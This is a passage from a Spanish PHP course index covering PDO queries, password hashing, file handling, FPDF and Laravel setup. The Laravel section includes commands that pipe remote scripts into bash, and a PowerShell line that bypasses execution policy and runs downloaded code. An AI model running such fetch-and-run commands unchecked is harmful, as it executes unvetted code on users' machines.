llamar\u00e1 al constructor antes de que se sobreescriban con los que vengan de la base de datos.</p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Consulta para una clase con constructor \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $sql = \"SELECT * FROM tienda\";\n\n    $sentencia = $conexion -&gt; prepare($sql);\n    $sentencia -&gt; setFetchMode(PDO::FETCH_CLASS | PDO::FETCH_PROPS_LATE, Tienda::class, [5, 'DefaultName', 'DefaultTlf']);\n    $sentencia -&gt; execute();\n\n    $tiendas = $sentencia-&gt;fetchAll();\n</code></pre> <p>Clase con constructor personalizado</p> <p>Como acabamos de ver, con la opci\u00f3n <code>PDO::FETCH_PROPS_LATE</code> debemos indicar un array con los argumentos con los que se llamar\u00e1 al constructor. Si en el constructor definimos par\u00e1metros opcionales, no ser\u00e1 necesario pasarlos en el array. E incluso si todos fueran opcionales, nos ahorrar\u00edamos pasar por completo el array.</p> <pre><code>&lt;?php\n//  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 clase Tienda \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\nclass Tienda {\n    // Constructor con par\u00e1metros opcionales\n    public function __construct(\n        private int $id=0,\n        private string $nombre='aa',\n        private string $tlf='dd'\n    ){} \n\n    // ...\n}\n</code></pre>"},{"location":"06accesoDatos.html#consultas-con-like","title":"Consultas con LIKE","text":"<p>Para utilizar el comod\u00edn LIKE u otros comodines, debemos asociarlo al dato y NUNCA en la propia consulta.</p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Utilizando comodines :: LIKE \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $sql = \"SELECT * FROM tienda WHERE nombre LIKE :nombre OR tlf LIKE :tlf\";\n\n    $sentencia = $conexion-&gt;prepare($sql);\n    $sentencia-&gt;setFetchMode(PDO::FETCH_CLASS | PDO::FETCH_PROPS_LATE, Tienda::class);\n\n    // Suponemos que 'busqueda' es lo que recibimos de un input de texto del formulario\n    $cadBuscar = \"%\" . $_POST['busqueda'] . \"%\";\n\n    $sentencia-&gt;execute([\"nombre\" =&gt; $cadBuscar, \"tlf\" =&gt; $cadBuscar]);\n\n    $result = $sentencia-&gt;fetchAll();\n</code></pre> <p>Ten\u00e9is una lista de ejemplos muy completa en la documentaci\u00f3n oficial.</p>"},{"location":"06accesoDatos.html#66-login-password","title":"6.6 Login &amp; Password","text":"<p>Para manejar un sistema completo de login y password con contrase\u00f1as cifradas, necesitamos un m\u00e9todo que cifre esos strings que el usuario introduce como contrase\u00f1a; tanto en el formulario de registro como en el del login, ya que al codificar una contrase\u00f1a, despu\u00e9s tenemos que comprobar que coincide con la que tenemos almacenada en la base de datos.</p> <p>Necesitamos pues:</p> <ul> <li> <p><code>password_hash()</code> se utiliza para crear un hash de la contrase\u00f1a que se pueda almacenar de manera segura en la base de datos (al hacer el INSERT).</p> <ul> <li> <p><code>PASSWORD_DEFAULT</code> opci\u00f3n flexible que utiliza el algoritmo de hashing recomendado por PHP en ese momento. A d\u00eda de hoy con PHP 8.4 es <code>bcrypt</code>.</p> </li> <li> <p><code>PASSWORD_BCRYPT</code> utiliza expl\u00edcitamente el algoritmo de hashing <code>bcrypt</code>.</p> </li> </ul> </li> <li> <p><code>password_verify()</code> permite verificar el hash compar\u00e1ndolo con la contrase\u00f1a pasada.</p> </li> </ul> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Almacenando usuario y password en BD \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $usu = $_POST[\"usuario\"];\n    $pas = $_POST[\"password\"];\n\n    $sql = \"INSERT INTO usuarios(usuario, password) VALUES (:usuario, :password)\";\n\n    $sentencia = $conexion -&gt; prepare($sql);\n\n    $isOk = $sentencia -&gt; execute([\n        \"usuario\" =&gt; $usu,\n        \"password\" =&gt; password_hash($pas, PASSWORD_DEFAULT)\n    ]);\n</code></pre> <p>Ahora que tenemos el hash del password guardado en la base de datos, vamos a recuperarlo para poder loguearlo correctamente.</p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Recuperando usuario y password en BD \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $usu = $_POST[\"login\"] ?? \"\";\n\n    $sql = \"select * from usuarios where usuario = ?\";\n\n    $sentencia = $conexion -&gt; prepare($sql);\n    $sentencia -&gt; execute([$usu]);\n\n    $usuario = $sentencia -&gt; fetch();\n\n    if($usuario &amp;&amp; password_verify($_POST['pass'], $usuario['password'])) {\n        echo\"OK!\";\n    } else {\n        echo\"KO\";\n    }\n</code></pre> <p>Almacenar el password</p> <p>Nunca almacenes el password del usuario en claro en la base de datos. Utiliza siempre res\u00famenes hash. Guardar las contrase\u00f1as completas podr\u00eda violar regulaciones espec\u00edficas sobre la protecci\u00f3n de datos personales y exponerte a sanciones legales si ocurre una brecha de seguridad.</p>"},{"location":"06accesoDatos.html#67-acceso-a-ficheros","title":"6.7 Acceso a ficheros","text":"<p>Gracias a la funcion fopen() desde PHP podemos abrir archivos que se encuentren en nuestros servidor o una URL.</p> <p>A esta funci\u00f3n hay que pasarle 2 par\u00e1metros; el nombre del archivo que queremos abrir y el modo en el que se abrir\u00e1</p> <pre><code>$fp = fopen(\"miarchivo.txt\", \"r\");\n</code></pre> <p>Muchas veces no podemos abrir el archivo porque \u00e9ste no se encuentra o no tenemos acceso a \u00e9l, por eso es recomendable comprobar que podemos hacerlo</p> <pre><code>if (!$fp = fopen(\"miarchivo.txt\", \"r\")){\n    echo \"No se ha podido abrir el archivo\";\n}\n</code></pre>"},{"location":"06accesoDatos.html#modos-de-apertura-de-ficheros","title":"Modos de apertura de ficheros","text":"<ul> <li><code>r</code>:  Modo lectura. Puntero al principio del archivo.</li> <li><code>r+</code>: Apertura para lectura y escritura. Puntero al principio del archivo</li> <li><code>w</code>: Apertura para escritura. Puntero al principio del archivo y lo sobreescribe. Si no existe se intenta crear.</li> <li><code>w+</code>: Apertura para lectura y escritura. Puntero al principio del archivo y lo sobreescribe. Si no existe se intenta crear.</li> <li><code>a</code>: Apertura para escritura. Puntero al final del archivo. Si no existe se intenta crear.</li> <li><code>a+</code>: Apertura para lectura y escritura. Puntero al final del archivo. Si no existe se intenta crear.</li> <li><code>x</code>: Creaci\u00f3n y apertura para s\u00f3lo escritura. Puntero al principio del archivo. Si el archivo ya existe dar\u00e1 error E_WARNING. Si no existe se intenta crear.</li> <li><code>x+</code>: Creaci\u00f3n y apertura para lectura y escritura. Mismo comportamiento que x.</li> <li><code>c</code>: Apertura para escritura. Si no existe se crea. Si existe no se sobreescribe ni da ning\u00fan error. Puntero al principio del archivo.</li> <li><code>c+</code>: Apertura para lectura y escritura. Mismo comportamiento que C.</li> <li><code>b</code>: Cuando se trabaja con archivos binarios como jpg, pdf, png y dem\u00e1s. Se suele colocar al final del modo, es decir rb, r+b, x+b, wb...</li> </ul>"},{"location":"06accesoDatos.html#operaciones-con-archivos","title":"Operaciones con archivos","text":"<p>Para poder leer un archivo necesitamos usar la funci\u00f3n fread() de PHP</p> <pre><code>//  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Abriendo un archivo y leyendo su contenido \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n$file = \"miarchivo.txt\";\n$fp = fopen($file, \"r\");\n\n// Leemos el contenido del fichero a la cadena $contens\n// filesize() nos devuelve el tama\u00f1o del archivo en cuesti\u00f3n\n$contents = fread($fp, filesize($file));\n\n// Hacemos split a array de las cadenas por el salto de l\u00ednea final\n$lineas = explode(\"\\n\", $contents);\nforeach($lineas as $linea){\n    echo \"&lt;p&gt;$linea&lt;/p&gt;\";\n}\n\n// Cerramos la conexi\u00f3n con el archivo\nfclose($fp);\n</code></pre> <p>Si lo que queremos es escribir en un archivo, deberemos hacer uso de la funci\u00f3n fwrite()</p> <pre><code>//  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Escribiendo en un archivo \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n$file = \"miarchivo.txt\";\n$texto = \"Hola que tal\";\n\n$fp = fopen($file, \"w\");\n\nfwrite($fp, $texto);\nfclose($fp);\n</code></pre>"},{"location":"06accesoDatos.html#informacion-de-un-fichero","title":"Informaci\u00f3n de un fichero","text":"<p>Con PHP y su m\u00e9todo stat() podemos obtener informaci\u00f3n sobre los archivos que le indiquemos. Este m\u00e9todo devuelve hasta un total de 12 elementos con informaci\u00f3n acerca de nuestro archivo.</p> <pre><code>0   dev         n\u00famero de dispositivo\n1   ino         n\u00famero de i-nodo\n2   mode        modo de protecci\u00f3n del i-nodo\n3   nlink       n\u00famero de enlaces\n4   uid         ID de usuario del propietario\n5   gid         ID de grupo del propietario\n6   rdev        tipo de dispositivo, si es un dispositivo i-nodo\n7   size        tama\u00f1o en bytes\n8   atime       momento del \u00faltimo acceso (tiempo Unix)\n9   mtime       momento de la \u00faltima modificaci\u00f3n (tiempo Unix)\n10  ctime       momento de la \u00faltima modificaci\u00f3n del i-nodo (tiempo Unix)\n11  blksize     tama\u00f1o del bloque E/S del sistema de ficheros\n12  blocks      n\u00famero de bloques de 512 bytes asignados\n</code></pre> <p>Unos ejemplos...</p> <pre><code>&lt;?php\n\n//  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Informaci\u00f3n del archivo \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n$file = \"miarchivo.txt\";\n$texto = \"Todos somos muy ignorantes, lo que ocurre es que no todos ignoramos las mismas cosas.\";\n\n$fp = fopen($file, \"w\");\nfwrite($fp, $texto);\n\n$datos = stat($file);\n\necho $datos[3] . \"&lt;br&gt;\"; // N\u00famero de enlaces, 1\necho $datos[7] . \"&lt;br&gt;\"; // Tama\u00f1o en bytes, 85\necho $datos[8] . \"&lt;br&gt;\"; // Momento de \u00faltimo acceso, 1444138104\necho $datos[9] . \"&lt;br&gt;\"; // Momento de \u00faltima modificaci\u00f3n, 1444138251\n\n?&gt;\n</code></pre> <p>Echa un vistazo a las funciones de directorios que tiene PHP, es muy interesante.</p>"},{"location":"06accesoDatos.html#archivos-pdf","title":"Archivos PDF","text":"<p>Con PHP podemos manejar todo tipo de archivos como ya hemos visto pero, \u00bfqu\u00e9 pasa si queremos generar ficheros PDF con datos sacados de una base de datos?</p> <p>Gracias a una clase escrita en PHP, podemos generar archivos PDF sin necesidad de instalar librer\u00edas adicionales en nuestro servidor.</p> <p>Para ello, como tenemos composer dentro de nuestra imagen de Docker, usaremos composer para instalar esta dependencia.</p> <p>Acu\u00e9rdate que debemes haber hecho <code>composer init</code> para empezar un proyecto con composer, de lo contrario no podr\u00e1s a\u00f1adir ning\u00fan paquete.</p> <p>Veamos un ejemplo de Hello World convertido a PDF</p> <p><pre><code>&lt;?php\n\nob_end_clean(); // Elimina el contenido del b\u00fafer de salida que se enviar\u00e1 al navegador\nrequire('fpdf/fpdf.php');\n\n// Instanciamos la clase\n// P = Portrait | mm = unidades en mil\u00edmetros | A4 = formato\n$pdf = new FPDF('P','mm','A4');\n\n// A\u00f1adimos una p\u00e1gina\n$pdf-&gt;AddPage();\n\n// Establecemos la fuente y el tama\u00f1o de letra\n$pdf-&gt;SetFont('Arial', 'B', 18);\n\n// Imprimimos una celda con el texto que nosotros queramos\n$pdf-&gt;Cell(60,20,'Hello World!');\n\n// Terminamos el PDF\n$pdf-&gt;Output();\n\n?&gt;\n</code></pre> Hay muchos ejemplos y tutoriales, as\u00ed como documentaci\u00f3n de la clase FPDF en la p\u00e1gina oficial.</p> <p>Visita la secci\u00f3n de tutoriales y el manual para sacar mayor partido a esta clase.</p> <pre><code>&lt;?php\n\nrequire('fpdf/fpdf.php');\n\nclass PDF extends FPDF {\n\n    // Cabecera\n    function Header() {\n\n        // A\u00f1adimos un logotipo\n        $this-&gt;Image('logo.png',10,8,33);\n\n        // establecemos la fuente y el tama\u00f1o\n        $this-&gt;SetFont('Arial','B',20);\n\n        // Movemos el contenido un poco a la derecha\n        $this-&gt;Cell(80);\n\n        // Pintamos la celda\n        $this-&gt;Cell(50,10,'Cabecera',1,0,'C');\n\n        // Pasamos a la siguiente l\u00ednea\n        $this-&gt;Ln(20);\n    }\n\n    // Pie de p\u00e1gina\n    function Footer() {\n\n        // Nos posicionamos a 1.5 cm  desde abajo del todo de la p\u00e1gina\n        $this-&gt;SetY(-15);\n\n        // Arial italic 8\n        $this-&gt;SetFont('Arial','I',8);\n\n        // N\u00famero de p\u00e1gina\n        $this-&gt;Cell(0,10,'P\u00e1gina ' . \n            $this-&gt;PageNo() . '/{nb}',0,0,'C');\n    }\n}\n\n// Instanciamos la clase\n$pdf = new PDF();\n\n// Definimos un alias para la numeraci\u00f3n de p\u00e1ginas\n$pdf-&gt;AliasNbPages();\n\n$pdf-&gt;AddPage();\n$pdf-&gt;SetFont('Times','',14);\n\nfor($i = 1; $i &lt;= 30; $i++)\n    $pdf-&gt;Cell(0, 10, 'N\u00famero de l\u00ednea ' \n            . $i, 0, 1);\n$pdf-&gt;Output();\n\n?&gt;\n</code></pre>"},{"location":"06accesoDatos.html#68-actividades","title":"6.8 Actividades","text":""},{"location":"06accesoDatos.html#crud-campeones","title":"CRUD campeones","text":"<ol> <li> <p>Crea una nueva base de datos con el nombre <code>lol</code> y cotejamiento de datos <code>utf8mb4_unicode_ci</code>.</p> </li> <li> <p>En nuestra base de datos <code>lol</code> que acabamos de crear,  vamos a crear la tabla <code>campeon</code> con los siguientes campos.</p> </li> </ol> <ul> <li>id [*]</li> <li>nombre</li> <li>rol</li> <li>dificultad</li> <li> <p>descripcion</p> <p>Acu\u00e9rdate que [*] significa que es clave primaria y no olvides poner el tipo de datos de cada uno de los campos.</p> </li> </ul> <ol> <li> <p>Vas a a\u00f1adir la funcionalidad de insertar un nuevo campeon. Crea un bot\u00f3n A\u00f1adir que redirigir\u00e1 usuario al archivo <code>603insertando.php</code> donde se mostrar\u00e1 un formulario con los datos a rellenar y con los que se crear\u00e1 el registro correspondiente en la tabla <code>campeon</code>. Crea al menos 5 registros de prueba, con los datos que t\u00fa quieras o si lo prefieres, puedes basarte en la p\u00e1gina oficial del juego pero \u00a1\u00a1 NO TE PONGAS A JUGAR !!</p> </li> <li> <p>Crea el archivo <code>604campeones.php</code> donde listes todos los campeones del LOL que has metido en tu base de datos. Acu\u00e9rdate que para ello deberas hacer una conexi\u00f3n con la base de datos y un <code>foreach</code> para cada campe\u00f3n que tengas albergado en la tabla <code>campeon</code>. Modifica el formulario de insertar anterior, para que una vez se inserte el nuevo registro, se rediriga al listado para ver los cambios.</p> </li> <li> <p>Modifica el archivo <code>604campeones.php</code> y gu\u00e1rdalo como <code>605campeones.php</code> pero pon al lado de cada uno de los campeones listados un bot\u00f3n para <code>editar</code> y otro para <code>borrar</code>. Cada uno de esos botones har\u00e1 la correspondiente funci\u00f3n dependiendo del id del campe\u00f3n seleccionado.</p> </li> </ol> <ul> <li> <p>Al pinchar en editar, el usuario ser\u00e1 redirigido al archivo <code>605editando.php</code> donde mostrar\u00e1 un formulario con los campos rellenos por los datos del campe\u00f3n seleccionado. Al darle al bot\u00f3n de <code>guardar</code> los datos se guardar\u00e1n en la base de datos y el usuario ser\u00e1 redirigido a la lista de campeones para poder ver los cambios.</p> </li> <li> <p>Al pinchar en borrar, al usuario se le preguntar\u00e1 a trav\u00e9s de un mensaje de JavaScript (prompt) si est\u00e1 seguro de que quiere borrar al campe\u00f3n seleccionado. En el mensaje de confirmaci\u00f3n debe aparecer el nombre del campe\u00f3n seleccionado. Si el usuario pincha en <code>Aceptar</code> el campe\u00f3n ser\u00e1 eliminado de la base de datos y el usuario ser\u00e1 redirigido nuevamente al listado de campeones para comprobar que, efectivamente dicho campe\u00f3n se ha eliminado de la lista.</p> </li> </ul>"},{"location":"06accesoDatos.html#filtros-y-comodines","title":"Filtros y comodines","text":"<ol> <li>modifica el archivo <code>604campeones.php</code> y gu\u00e1rdalo como <code>606campeones.php</code> para que se muestre como una tabla con las columnas de la propia tabla de la base de datos, es decir; id, nombre, rol, dificultad, descripci\u00f3n. Al lado de cada nombre de cada columna, pon 2 iconos que sean \u02c4 \u02c5 y que cada uno de ellos ordene el listado en funci\u00f3n de cu\u00e1l se haya pinchado.</li> </ol> <ul> <li> <p>Si se ha pulsado en Nombre el icono de \u02c4, el listado debe aparecer ordenado por nombre ascendente. Si por el contrario se ha pulsado \u02c5 tendr\u00e1 que ordenarse por nombre descendente.</p> </li> <li> <p>Ten en cuenta que cada icono debe llevar consigo un enlace al listado que contenga par\u00e1metros en la URL que satisfagan las opciones seleccionadas as\u00ed que haced uso de $_GET para poder capturarlos y escribid las consultas SQL que sean necesarias para hacer cada uno de los filtros.</p> </li> <li> <p>Puedes usar Font Awesome para los iconos pero es algo opcional.</p> </li> </ul>"},{"location":"06accesoDatos.html#login","title":"Login","text":"<ol> <li> <p>Aprovecha lo que hiciste de los ejercicios 601 al 604 pero esta vez utilizando <code>PDO::FETCH_ASSOC</code>.</p> </li> <li> <p>Crea una tabla nueva dentro de la base de datos <code>lol</code> que ya tienes y crea un sistema de login con usuarios. Introduce en la base de datos al menos 3 usuarios diferentes con sus contrase\u00f1as distintas. Recuerda que:</p> </li> </ol> <ul> <li> <p>La tabla nueva ha de llamarse <code>usuario</code></p> </li> <li> <p>Los campos a crear en la nueva tabla deben ser</p> <ul> <li><code>id</code> [*]</li> <li><code>nombre</code></li> <li><code>usuario</code></li> <li><code>password</code></li> <li><code>email</code></li> </ul> </li> <li> <p>Las contrase\u00f1as deben ser cifradas antes de guardar el datos en la base de datos.</p> </li> <li> <p>Crea el formulario <code>608registro.php</code> donde el usuario introduzca los datos de registro y vinc\u00falalo con <code>608nuevoUsuario.php</code> para que recoja los datos mediante POST y los inserte en la base de datos si todo ha ido bien.</p> </li> <li> <p>Queda PROHIBID\u00cdSIMO acceder a <code>608nuevoUsuario.php</code> sin el formulario rellenado.</p> </li> <li> <p>La sentencia de INSERT debe estar controlada para que no pueda introducirse ning\u00fan dato en blanco. Ten en cuenta que est\u00e1s modificando la base de datos y no queremos campos mal rellenados.</p> </li> <li> <p>Si todo ha ido bien, muestra un mensaje por pantalla diciendo <code>El usuario XXX ha sido introducido en el sistema con la contrase\u00f1a YYY</code>.</p> </li> </ul> <ol> <li>Haz las modificaciones necesarias para que cada usuario registrado en el sistema pueda tener su propio listado de campeones y con la misma funcionalidad de a\u00f1adir, editar y eliminar los que considere. Deber\u00e1s empezar por un sistema de login en el que se pida el usuario y la contrase\u00f1a...</li> </ol>"},{"location":"06accesoDatos.html#ficheros","title":"Ficheros","text":"<ol> <li> <p>M\u00e9tete en loremipsum.com y genera un texto de 3 p\u00e1rrafos. Copia el texto generado y gu\u00e1rdalo en un archivo nuevo llamado <code>610loremIpsum.txt</code>. Genera un archivo php llamado <code>610loremIpsum.php</code> y muestra por pantalla el texto del archivo txt que acabas de crear, su tama\u00f1o en Kilobytes , la fecha de su \u00faltima modificaci\u00f3n y el ID de usuario que cre\u00f3 el archivo.</p> </li> <li> <p>Vuelve a cargar el archivo <code>606campeones.php</code> y ren\u00f3mbralo a <code>611campeones.php</code> pero en vez de mostrar la tabla por pantalla, genera un archivo CSV <code>611campeones.csv</code> y otro <code>611campeonesCSV.php</code> donde saques por pantalla el contenido del archivo <code>611campeones.csv</code>.</p> </li> </ol>"},{"location":"06accesoDatos.html#proyecto-fernanchollo","title":"Proyecto FernanChollo","text":"<p>Desarrolla una app al estilo de Chollometro en la que los usuarios publican chollos que encuentran por internet y se listan en funci\u00f3n de varios filtros: nuevos, m\u00e1s votados, m\u00e1s vistos, m\u00e1s comentados...</p> <ol> <li> <p>Estructura el proyecto y piensa en las tablas y bases de datos que necesit\u00e9is para crear el proyecto. Crea los diagramas E/R necesarios con nombres como <code>620ERnombreTabla</code> metiendo todos los campos que se necesiten as\u00ed como las relaciones que creas necesarias. Establece un sistema de archivos para el proyecto, teniendo en cuenta que van a haber im\u00e1genes, css, funciones php, constantes e incluso javaScript (pero algo b\u00e1sico) para controlar los eventos del usuario a lo largo de la interfaz.</p> </li> <li> <p>Crea un sistema de login/password con los roles <code>administrador</code> y <code>usuario</code>. De momento que se validen los usuarios correctamente utilizando encriptaci\u00f3n en la contrase\u00f1a.</p> </li> </ol> <ul> <li> <p><code>Administrador</code>: Puede ver todos los usuarios registrados as\u00ed como los administradores y los chollos creados en la base de datos.</p> </li> <li> <p><code>Usuario</code>: Puede ver sus propios chollos, editarlos y borrarlos, adem\u00e1s de crear nuevos.</p> </li> </ul> <ol> <li> <p>Crea la vista para poner nuevos chollos y recuerda s\u00f3lo pueden entrar a esta vista usuarios registrados o administradores.</p> </li> <li> <p>Crea la vista donde se muestren todos los chollos creados. Esta vista puede verla cualquier usuario, registrado o no en el sistema. Ten en cuenta que esta vista ser\u00e1 la vista general de la web as\u00ed que puedes llamarla <code>index.php</code> donde despu\u00e9s aplicaremos filtros por $_GET.</p> </li> </ol>"},{"location":"06accesoDatos.html#videoclub-60","title":"Videoclub 6.0","text":"<p>Por fin vamos a darle persistencia al videoclub mediante bases de datos.</p> <ol> <li> <p>Crea desde phpMyAdmin una base de datos con nombre <code>videoclub</code> y un usuario con nombre <code>videoclub_user</code> con permisos \u00fanicamente sobre esta base de datos, ya sabes, por temas de seguridad. Como m\u00ednimo, necesitar\u00e1s las tablas <code>cliente</code> y <code>soportes</code>. Revisa el diagrama UML del final del tema 3 para tener claro el esquema. Es posible que necesites a\u00f1adir alg\u00fan campo a alguna de las clases...</p> </li> <li> <p>Implementa las clase <code>ClienteDataAccess</code> encapsulando en ella todo lo relativo a la comunicaci\u00f3n con la BDD (conexi\u00f3n y CRUD con bindParam).</p> </li> <li> <p>En la parte que ya tienes desarrollada relativa a la gesti\u00f3n de clientes, utiliza la clase anterior para dar persistencia con la BDD. Ya no necesitar\u00e1s los datos de prueba que utilizabas en el index.php al principio. </p> </li> <li> <p>Implementa las clase <code>SoporteDataAccess</code> encapsulando en ella todo lo relativo a la comunicaci\u00f3n con la BDD (conexi\u00f3n y CRUD con bindParam).</p> </li> <li> <p>Ahora toca desarrollar todo lo nuevo relativo a la gesti\u00f3n de alquileres. Utiliza la clase anterior para dar persistencia con la BDD. Piensa muy bien c\u00f3mo hacerlo antes de empezar a programar: c\u00f3mo se almacenar\u00e1n los soportes que son de diferente tipo, c\u00f3mo marcar\u00e1s los soportes que est\u00e9n alquilados a un determinado cliente (en la propia tabla o en otra)...</p> </li> </ol>"},{"location":"07frameworks.html","title":"07frameworks","text":""},{"location":"07frameworks.html#introduccion-a-laravel","title":"Introducci\u00f3n a Laravel","text":"<p>Duraci\u00f3n estimada: 40 sesiones</p>"},{"location":"07frameworks.html#71-introduccion","title":"7.1 Introducci\u00f3n","text":""},{"location":"07frameworks.html#que-es-un-framework","title":"\u00bfQu\u00e9 es un framework?","text":"<p>Un framework proporciona una estructura base para el desarrollo de aplicaciones, facilitando tareas como:</p> <ul> <li>Conexi\u00f3n a bases de datos.</li> <li>Organizaci\u00f3n del c\u00f3digo.</li> <li>Gesti\u00f3n de rutas y validaciones.</li> </ul> <p>La mayor\u00eda de frameworks PHP siguen el patr\u00f3n MVC (Modelo-Vista-Controlador), que permite separar claramente la l\u00f3gica de negocio, la interfaz de usuario y los datos.</p>"},{"location":"07frameworks.html#por-que-utilizar-un-framework","title":"\u00bfPor qu\u00e9 utilizar un framework?","text":"<p>Los frameworks ofrecen:</p> <ul> <li>Estandarizaci\u00f3n: Promueven buenas pr\u00e1cticas de desarrollo.</li> <li>Eficacia: Aceleraci\u00f3n del desarrollo con herramientas preconstruidas.</li> <li>Mantenibilidad: Facilitan la escalabilidad y el mantenimiento del c\u00f3digo.</li> </ul> <p>Ejemplos de frameworks PHP populares:</p> <ul> <li>Laravel: Sintaxis clara, funcionalidades modernas, ideal para proyectos de cualquier tama\u00f1o.</li> <li>Symfony: Robusto y altamente modular, enfocado en aplicaciones complejas.</li> <li>Slim: Ligero e ideal para APIs RESTful.</li> </ul>"},{"location":"07frameworks.html#por-que-elegir-laravel","title":"\u00bfPor qu\u00e9 elegir Laravel?","text":"<p>Laravel es uno de los frameworks m\u00e1s populares gracias a:</p> <ul> <li>Facilidad de uso: Sintaxis expresiva e intuitiva.</li> <li>Patr\u00f3n MVC: Claramente implementado para separar l\u00f3gica, vistas y datos.</li> <li>ORM Eloquent: Gesti\u00f3n intuitiva de bases de datos.</li> <li>Migraciones: Control de versiones para estructuras de bases de datos.</li> <li>Artisan CLI: Automatizaci\u00f3n de tareas habituales como migraciones o generaci\u00f3n de modelos.</li> <li>Blade: Motor de plantillas con sintaxis simplificada.</li> <li>Seguridad integrada: Protecci\u00f3n contra ataques como CSRF y XSS.</li> </ul>"},{"location":"07frameworks.html#72-instalacion-de-laravel","title":"7.2 Instalaci\u00f3n de Laravel","text":"<p>A continuaci\u00f3n, se van a ver 3 alternativas distintas para instalar las dependencias necesarias para trabajar con Laravel en un entorno de desarrollo local. Elige la que m\u00e1s te convenga. Se pueden encontrar m\u00e1s opciones y las \u00faltimas recomendaciones directamente en la documentaci\u00f3n oficial.</p>"},{"location":"07frameworks.html#a-manual","title":"a. Manual","text":"<p>Lanzar el siguiente script de php.new que instalar\u00e1 PHP, Composer y el instalador Laravel en el equipo.</p> En macOSEn Windows <pre><code>/bin/bash -c \"$(curl -fsSL https://php.new/install/mac/8.4)\"\n</code></pre> <pre><code># Run as administrator...\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://php.new/install/windows/8.4'))\n</code></pre> <p>Despu\u00e9s de lanzar el comando de arriba hay que reiniciar la sesi\u00f3n de la terminal.</p> <p>Si en cualquier momento queremos acutalizar PHP, Composer o el instalador de Laravel, bastar\u00e1 con volver a ejecutar el comando en la terminal.</p> <p>Si ya tenemos instalado PHP y Composer en el equipo, s\u00f3lo es necesario instalar Laravel de la siguiente forma:</p> <pre><code>composer global require laravel/installer\n</code></pre>"},{"location":"07frameworks.html#crear-proyecto","title":"Crear proyecto","text":"<p>Una vez tenemos instalados PHP, Composer y el instalador de Laravel en el equipo, para crear una aplicaci\u00f3n con el nombre example-app vamos al directorio de nuestros proyectos y ejecutamos:</p> <pre><code>laravel new example-app\n</code></pre> <p>Una vez creada la aplicaci\u00f3n, hay que iniciar el servidor de desarrollo local usando el script dev de Composer:</p> <pre><code>cd example-app\nnpm install &amp;&amp; npm run build\ncomposer run dev\n</code></pre> <p>Una vez iniciado el servidor de desarrollo, la aplicaci\u00f3n ser\u00e1 accesible en el navegador web en <code>http://localhost:8000</code>.</p> Creaci\u00f3n de proyecto de forma manual"},{"location":"07frameworks.html#b-laravel-herd","title":"b. Laravel Herd","text":"<p>Herd es un entorno de desarrollo nativo de Laravel y PHP para macOS y Windows, incre\u00edblemente r\u00e1pido. Incluye todo lo que necesitas para comenzar a desarrollar con Laravel, incluidos PHP y nginx. Una vez que instales Herd, estar\u00e1s listo para comenzar a desarrollar con Laravel.</p> <p>Puedes descargar Herd desde aqu\u00ed. Incluye la \u00faltima versi\u00f3n de PHP y Composer y configura tu equipo para ejecutar el servidor web Nginx en segundo plano para servir autom\u00e1ticamente cualquier aplicaci\u00f3n de Laravel en ~/Herd a trav\u00e9s de la URL formada por el nombre de su directorio y el dominio .test.</p> <p>Ten en cuenta que la versi\u00f3n gratuita no tiene soporte para BBDD, por lo que ese servicio tendremos que proporcionarlo mediante XAMPP, Laragon, Docker...</p> <p>Y como siempre, es recomendable echar un vistazo a la documentaci\u00f3n oficial de Herd.</p>"},{"location":"07frameworks.html#crear-proyecto_1","title":"Crear proyecto","text":"<p>Crear una nueva aplicaci\u00f3n en Herd es muy sencillo. Hay que desplegar su men\u00fa, entrar a Sites y desde ah\u00ed clic en +. </p> <p>Seguir los pasos del script y por ejemplo, un proyecto con nombre example-app estar\u00e1 disponible en <code>http://example-app.test</code>.</p> Creaci\u00f3n de proyecto de forma manual"},{"location":"07frameworks.html#c-contenedores-docker","title":"c. Contenedores Docker","text":"<p>Laravel Sail es una interfaz de l\u00ednea de comandos que permite crear una aplicaci\u00f3n de Laravel con PHP, MySQL y Redis sin necesidad de tener experiencia previa con Docker.</p> <p>Por ejemplo, para crear una aplicaci\u00f3n con el nombre example-app ejecutaremos directamente el comando:</p> En macOSEn Windows <pre><code>curl -s \"https://laravel.build/example-app\" | bash\n</code></pre> <pre><code>curl -s https://laravel.build/example-app | bash\n</code></pre> <p>Una vez creados los contenedores, accedemos al directorio de la app y lanzamos Laravel Sail:</p> <pre><code>cd example-app\n./vendor/bin/sail up\n</code></pre> <p>Por \u00faltimo, lanzamos las migraciones de la BDD:</p> <pre><code>./vendor/bin/sail artisan migrate\n</code></pre> <p>Y la aplicaci\u00f3n ya es accesible desde <code>http://localhost/</code>.</p> <p>Si queremos que funcione phpmyadmin hay que a\u00f1adir otro contenedor docker a mano o incluyendo el siguiente c\u00f3digo en el docker-compose.yml:</p> <pre><code>phpmyadmin:\n      image: 'phpmyadmin:latest'\n      ports:\n          - 8080:80\n      environment:\n          MYSQL_ROOT_PASSWORD: '${DB_PASSWORD}'\n      links:\n          - \"mysql:db\"\n      depends_on:\n          - mysql\n      networks:\n          - sail\n</code></pre> <p>Parando Laravel Sail y volvi\u00e9ndolo a lanzar ya lo tenemos funcionando:</p> <pre><code>./vendor/bin/sail up\n</code></pre> Contenedores de Laravel Sail <p>A tener en cuenta</p> <p>Esta es la opci\u00f3n m\u00e1s sencilla para 